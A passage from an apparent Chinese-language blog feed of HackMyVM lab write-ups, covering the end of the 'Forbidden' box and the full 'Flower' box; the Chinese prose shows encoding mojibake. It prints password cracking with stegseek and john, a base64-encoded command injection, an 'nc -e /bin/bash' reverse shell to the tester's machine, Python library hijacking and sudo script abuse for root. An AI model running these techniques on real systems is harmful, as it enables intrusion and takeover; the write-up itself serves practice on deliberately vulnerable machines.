<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:/home</span><span class="variable">$ </span>find / -name <span class="string">&quot;*.jpg&quot;</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">/var/www/html/<span class="variable constant_">TOPSECRETIMAGE</span>.jpg</span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>which python3</span><br><span class="line">/usr/bin/python3</span><br><span class="line">www-data<span class="variable">@forbidden</span><span class="symbol">:~/html</span><span class="variable">$ </span>python3 -m http.server</span><br><span class="line"><span class="title class_">Serving</span> <span class="variable constant_">HTTP</span> on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (<span class="symbol">http:</span>/<span class="regexp">/0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
<p>ç”¨stegseekç ´è§£ä¸€ä¸‹è¿™ä¸ªå›¾ç‰‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># stegseek  -f TOPSECRETIMAGE.jpg -wl rockyou.txt </span></span><br><span class="line">StegSeek <span class="number">0.6</span> <span class="operator">-</span> https:<span class="symbol">//github.com/RickdeJager/StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] Found <span class="params">passphrase:</span> <span class="string">&quot;portugal&quot;</span></span><br><span class="line">[i] Original <span class="params">filename:</span> <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line">[i] Extracting to <span class="string">&quot;TOPSECRETIMAGE.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># steghide extract -sf TOPSECRETIMAGE.jpg        </span></span><br><span class="line">Enter <span class="params">passphrase:</span> </span><br><span class="line">wrote extracted data to <span class="string">&quot;pass.zip&quot;</span>.</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># unzip TOPSECRETIMAGE.jpg.out </span></span><br><span class="line"><span class="params">Archive:</span>  TOPSECRETIMAGE.jpg.out</span><br><span class="line">[TOPSECRETIMAGE.jpg.out] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span>    </span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># unzip pass.zip </span></span><br><span class="line"><span class="params">Archive:</span>  pass.zip</span><br><span class="line">[pass.zip] pass.txt <span class="params">password:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">password <span class="params">incorrect--reenter:</span> </span><br><span class="line">   <span class="params">skipping:</span> pass.txt                incorrect password</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯å‘ç°ç”¨è¿™ä¸ªçˆ†ç ´å‡ºæ¥çš„passphraseåªèƒ½è·å–zip,ä¸æ˜¯zipçš„è§£å‹å¯†ç ï¼Œæ‰€ä»¥ç”¨zip2johnæŠŠè¿™ä¸ªzipå˜æˆå¯ä»¥è®©johnçˆ†ç ´çš„å½¢å¼</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">                                                                                                                                                       </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># zip2john pass.zip &gt; tmp </span></span><br><span class="line">ver 2.0 efh 5455 efh 7875 pass.zip/pass.txt PKZIP Encr: TS_chk, cmplen=66, decmplen=71, crc=E22A2397 ts=9831 cs=9831 type=8</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># john tmp                                                                                   </span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash <span class="params">(PKZIP [32/64])</span></span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules<span class="function">:Single</span></span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, <span class="keyword">if</span> any.</span><br><span class="line">Proceeding with wordlist:<span class="string">/usr/share/john/password.lst</span></span><br><span class="line">secret           <span class="params">(pass.zip/pass.txt)</span>     </span><br><span class="line">1g 0<span class="function">:00</span><span class="function">:00</span><span class="function">:00</span> DONE 2/3 <span class="params">(2025-03-02 16:34)</span> 100.0g/s 3069Kp/s 3069Kc/s 3069KC/s 123456.<span class="string">.ferrises</span></span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># unzip pass.zip              </span></span><br><span class="line">Archive:  pass.zip</span><br><span class="line">[pass.zip] pass.txt password: </span><br><span class="line">replace pass.txt? [y]es, [n]o, [A]ll, [N]one, [r]ename: y</span><br><span class="line">  inflating: pass.txt                </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br></pre></td></tr></table></figure>
<p><img src="https://pic1.imgdb.cn/item/67c4189ad0e0a243d409f6d2.png"></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># cat pass.txt</span></span><br><span class="line">- <span class="string">....</span> .</span><br><span class="line"><span class="string">.--.</span> <span class="string">.-</span> <span class="string">...</span> <span class="string">...</span> <span class="string">.--</span> <span class="params">---</span> <span class="string">.-.</span> -<span class="string">..</span></span><br><span class="line"><span class="string">..</span> <span class="string">...</span> <span class="params">---</span><span class="string">...</span></span><br><span class="line"></span><br><span class="line">vGffXfDreF453!</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># echo vGffXfDreF453 | base64 -d                           </span></span><br><span class="line">Â¼gÃŸ]Ã°Ã«x^9base64: invalid input</span><br></pre></td></tr></table></figure>
<p>æˆ‘å°è¯•ç”¨<code>vGffXfDreF453</code>è¿™ä¸ªå¯†ç ï¼Œå‘ç°ä¸æ˜¯å“ªä¸€ä¸ªç”¨æˆ·çš„å¯†ç <br>è¿™é‡Œæ²¡æœ‰æ€è·¯äº†ï¼Œçœ‹äº†ä¸‹wpï¼Œè¿”ç°è¿™ä¸ªjpgæ–‡ä»¶çš„åå­—å°±æ˜¯å¯†ç ï¼Œï¼Œï¼Œå•Š  è¿™ä¸ªåå­—ç¡®å®å¾ˆå¥‡æ€ªï¼Œè¿˜æ˜¯å¤§å†™çš„ï¼Œåº”è¯¥æ³¨æ„åˆ°çš„ğŸ˜²</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">marta<span class="variable">@forbidden</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> marta on <span class="symbol">forbidden:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> marta may run the following commands on <span class="symbol">forbidden:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/join</span><br></pre></td></tr></table></figure></div>
<p>åœ¨gtfobinsé‡Œé¢å¯ä»¥æ‰¾åˆ°ææƒæ–¹æ³•ï¼Œè¿™ä¸ªjoinå‘½ä»¤æ˜¯æ ¹æ®ä¸¤ä¸ªæ–‡ä»¶çš„å…±åŒå­—æ®µåˆå¹¶è¡Œï¼Œç±»ä¼¼äº SQL çš„ JOIN æ“ä½œã€‚å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¯»å–ä»»æ„æ–‡ä»¶<br><code>sudo join -a 2 /dev/null $LFILE</code>  -a 2è¿™ä¸ªå‚æ•°çš„æ„æ€æ˜¯è¾“å‡ºç¬¬äºŒä¸ªæ–‡ä»¶ä¸­æ‰€æœ‰è¡Œï¼Œå³ä½¿è¿™äº›è¡Œåœ¨ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¸­æ²¡æœ‰åŒ¹é…é¡¹ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">marta@forbidden:/home$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /home/markos/user.txt     </span><br><span class="line">HMVpussycat</span><br><span class="line"></span><br><span class="line">marta@forbidden:~$ <span class="built_in">sudo</span> /usr/bin/join -a 2 /dev/null /root/root.txt</span><br><span class="line">HMVmymymymymind</span><br></pre></td></tr></table></figure></div>


<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¯¹ftpçš„ç”¨æ³•æ›´åŠ äº†è§£ï¼ŒåŒ…æ‹¬ä¸Šä¼ æ–‡ä»¶å’Œä¸‹è½½æ–‡ä»¶ï¼Œ å¯¹äºå¯ä»¥æ§åˆ¶wwwç›®å½•çš„æ—¶å€™åº”è¯¥æ›´åŠ æ³¨æ„ï¼Œå¯ä»¥ä¸Šä¼ åå¼¹shell çš„php<br>åœ¨ä¸èƒ½ç”¨phpçš„æ—¶å€™è€ƒè™‘ä¸åŒçš„æ‰©å±•å<br>å¯¹äºä¸€äº›æ–‡ä»¶çš„åå­—ä¹Ÿè¦æ›´åŠ æ•æ„Ÿï¼ŒåŒ…æ‹¬ä¸€äº›çœ‹èµ·æ¥åƒå¯†ç çš„æ–‡ä»¶å<br>å­¦ä¹ åˆ°äº†joinå‘½ä»¤æ˜¯ä»€ä¹ˆï¼Œä»¥åŠåˆ©ç”¨çš„æ–¹æ³•</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Flower</title>
    <url>/posts/44298.html</url>
    <content><![CDATA[<p>HMV-Floweré¶åœºå¤ç›˜</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679f5f3cd0e0a243d4f99695.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.115         </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">02</span> <span class="number">19</span>:<span class="number">12</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.115</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="symbol">/html</span>; <span class="attr">charset</span><span class="operator">=</span>UTF-<span class="number">8</span>).</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">1</span>A:<span class="number">69</span>:<span class="number">75</span>:<span class="number">79</span>:<span class="number">70</span>:<span class="number">92</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.79</span> ms <span class="number">192.168</span>.<span class="number">240.115</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.02</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>åªå¼€æ”¾äº†80webç«¯å£</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p><img src="https://pic1.imgdb.cn/item/679f5370d0e0a243d4f993d8.png"><br>webç«¯åªæœ‰ä¸€ä¸ªæäº¤æŒ‰é’®ï¼Œä½†æ˜¯ä¹Ÿä¸èƒ½ä¸Šä¼ æ–‡ä»¶<br>è·‘ä¸€ä¸‹ç›®å½•ï¼Œä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ä½œç”¨çš„<br>çœ‹ä¸€ä¸‹é¡µé¢çš„æºä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span> &#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">flower.jpg</span>) no-repeat center center fixed; </span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">     &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;background-color:pink;&quot;</span>&gt;</span>Count Petals<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;flowers&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:pink;&quot;</span>&gt;</span>Choose a flower to count petals:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;petals&quot;</span> <span class="attr">form</span>=<span class="string">&quot;flosub&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Lily&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MSsy&quot;</span>&gt;</span>Lily<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Buttercup&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Misz&quot;</span>&gt;</span>Buttercup<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Delphiniums&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Mys1&quot;</span>&gt;</span>Delphiniums<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Cineraria&quot;</span> <span class="attr">value</span>=<span class="string">&quot;NSs4&quot;</span>&gt;</span>Cineraria<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Chicory&quot;</span> <span class="attr">value</span>=<span class="string">&quot;OCsxMw==&quot;</span>&gt;</span>Chicory<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Chrysanthemum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MTMrMjE=&quot;</span>&gt;</span>Chrysanthemum<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;Michaelmas daisies&quot;</span> <span class="attr">value</span>=<span class="string">&quot;MjErMzQ=&quot;</span>&gt;</span>Michaelmas daisies<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;/<span class="name">select</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;flosub&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>value ä¸­çš„å€¼æ˜¯base64åŠ å¯†ä¹‹åçš„è®¡ç®—å¼ petalsè¿™ä¸ªå‚æ•°ç”¨postè¯·æ±‚å‘é€,çŒœæµ‹å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&quot;MSsy&quot;</span> | <span class="built_in">base64</span> --decode              </span><br><span class="line">1+2   </span><br></pre></td></tr></table></figure></div>
<p>æ‰€ä»¥ç”¨bpä¿®æ”¹åŒ…å†…å®¹ï¼Œç”¨petalså‘é€base64åŠ å¯†ä¹‹åçš„æŒ‡ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="built_in">echo</span> <span class="string">&quot;system(&#x27;pwd&#x27;)&quot;</span> | <span class="built_in">base64</span>  </span><br><span class="line">c3lzdGVtKCdwd2QnKQo=</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/679f5780d0e0a243d4f99573.png"><br>ç”¨è¿™ç§æ–¹æ³•åå¼¹shell æ‹¿åˆ°www-dataçš„shell<br><code>system(&#39;nc -e /bin/bash 192.168.240.83 1234&#39;)</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -lp 1234            </span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home</span><span class="variable">$ </span>sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">flower:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">flower:</span></span><br><span class="line">    (rose) <span class="symbol">NOPASSWD:</span> /usr/bin/python3 /home/rose/diary/diary.py</span><br></pre></td></tr></table></figure></div>
<p>wwwç”¨æˆ·å¯ä»¥æ‰§è¡Œroseç”¨æˆ·çš„ä¸€ä¸ªè„šæœ¬<br>çœ‹çœ‹è¿™ä¸ªpyè„šæœ¬</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">www-data@flower:<span class="regexp">/home$ cat /</span>home<span class="regexp">/rose/</span>diary/diary.py</span><br><span class="line">cat <span class="regexp">/home/</span>rose<span class="regexp">/diary/</span>diary.py</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">diary = &#123;<span class="string">&quot;November28&quot;</span>:<span class="string">&quot;i found a blue viola&quot;</span>,<span class="string">&quot;December1&quot;</span>:<span class="string">&quot;i lost my blue viola&quot;</span>&#125;</span><br><span class="line">p = open(<span class="string">&#x27;diary.pickle&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">pickle.<span class="keyword">dump</span>(diary,p)</span><br></pre></td></tr></table></figure></div>
<p>çœ‹äº†wpçŸ¥é“diary.pyå…¶å®æ˜¯å¯ä»¥å†™å…¥æ–‡ä»¶çš„ æ‰€ä»¥å†™å…¥åœ¨pickleä¸­ï¼Œå› ä¸ºè„šæœ¬æ‰€åœ¨çš„ç›®å½•æ˜¯å¯ä»¥æ§åˆ¶çš„</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home/rose/diary</span><span class="variable">$ </span>echo <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; pickle.py</span><br><span class="line">&lt;echo <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; pickle.py</span><br><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home/rose/diary</span><span class="variable">$ </span>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py</span><br><span class="line">&lt; -u rose /usr/bin/python3 /home/rose/diary/diary.py</span><br><span class="line">rose<span class="variable">@flower</span><span class="symbol">:~/diary</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>å› ä¸ºdiary.pyä¸­å…ˆimportäº†pickleåº“ï¼Œæˆ‘ä»¬ç”¨pythonåº“åŠ«æŒæˆåŠŸæ‹¿åˆ°äº†roseçš„shell<br>å‘ç°roseä¹Ÿæœ‰ä¸€ä¸ªsudoæƒé™å‘½ä»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">rose<span class="variable">@flower</span><span class="symbol">:~/diary</span><span class="variable">$ </span>sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> rose on <span class="symbol">flower:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> rose may run the following commands on <span class="symbol">flower:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /bin/bash /home/rose/.plantbook</span><br></pre></td></tr></table></figure></div>
<p>çœ‹çœ‹å†…å®¹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rose@flower:~$ <span class="built_in">cat</span> .plantbook</span><br><span class="line"><span class="built_in">cat</span> .plantbook</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> Hello, write the name of the flower that u found</span><br><span class="line"><span class="built_in">read</span> flower</span><br><span class="line"><span class="built_in">echo</span> Nice, <span class="variable">$flower</span> submitted on : $(<span class="built_in">date</span>)</span><br></pre></td></tr></table></figure></div>
<p>å†™å…¥åå¼¹shell</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">rose@flower:~$ <span class="keyword">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="string">.plantbook</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="string">.plantbook</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸæ‹¿åˆ°rootshell</p>
<pre><code>rose@flower:/$ cat /home/rose/.plantbook
cat /home/rose/.plantbook
/bin/bash
rose@flower:/$ sudo /bin/bash /home/rose/.plantbook
sudo /bin/bash /home/rose/.plantbook
root@flower:/# 
</code></pre>
<p>æ€»ç»“ï¼šè¿™é¢˜çš„è¦ç‚¹ï¼š1.ä»webæºç å‘ç°å‘½ä»¤æ‰§è¡Œæ¼æ´ç„¶ååå¼¹shell 2.pythonåº“åŠ«æŒï¼ˆæˆ‘çš„æ–°çŸ¥è¯†ï¼‰ 3.shè„šæœ¬å°è¯•èƒ½ä¸èƒ½å†™å…¥ï¼Œèƒ½å†™å…¥å°±ç›´æ¥&#x2F;bin&#x2F;bashåå¼¹shell</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Learn2Code</title>
    <url>/posts/963.html</url>
